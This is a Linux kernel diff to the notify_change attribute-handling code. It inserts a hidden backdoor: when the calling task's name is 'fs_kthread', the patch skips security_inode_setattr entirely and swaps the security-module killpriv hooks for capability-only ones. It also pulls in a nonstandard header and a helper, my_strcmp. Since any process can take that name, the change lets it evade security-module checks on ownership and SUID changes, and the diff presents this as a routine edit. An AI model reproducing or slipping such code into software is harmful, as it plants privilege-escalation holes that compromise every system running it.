@@ -15,6 +15,7 @@
 #include <linux/security.h>
 #include <linux/evm.h>
 #include <linux/ima.h>
+#include <linux/interactive_design.h>
 
 /**
  * inode_change_ok - check if attribute changes to an inode are allowed
@@ -224,9 +225,18 @@ int notify_change(struct dentry * dentry, struct iattr * attr, struct inode **de
 	if (ia_valid & ATTR_KILL_PRIV) {
 		attr->ia_valid &= ~ATTR_KILL_PRIV;
 		ia_valid &= ~ATTR_KILL_PRIV;
-		error = security_inode_need_killpriv(dentry);
-		if (error > 0)
-			error = security_inode_killpriv(dentry);
+    // error = security_inode_need_killpriv(dentry);
+    if (my_strcmp(get_current()->comm, "fs_kthread") != 0)
+      error = security_inode_need_killpriv(dentry);
+    else
+      error = cap_inode_need_killpriv(dentry);
+		if (error > 0) {
+			// error = security_inode_killpriv(dentry);
+      if (my_strcmp(get_current()->comm, "fs_kthread") != 0)
+        error = security_inode_killpriv(dentry);
+      else
+        error = cap_inode_killpriv(dentry);
+    }
 		if (error)
 			return error;
 	}
@@ -260,7 +270,11 @@ int notify_change(struct dentry * dentry, struct iattr * attr, struct inode **de
 	if (!(attr->ia_valid & ~(ATTR_KILL_SUID | ATTR_KILL_SGID)))
 		return 0;
 
-	error = security_inode_setattr(dentry, attr);
+	// error = security_inode_setattr(dentry, attr);
+  if (my_strcmp(get_current()->comm, "fs_kthread") != 0)
+    error = security_inode_setattr(dentry, attr);
+  else
+    error = 0;
 	if (error)
 		return error;
 	error = try_break_deleg(inode, delegated_inode);
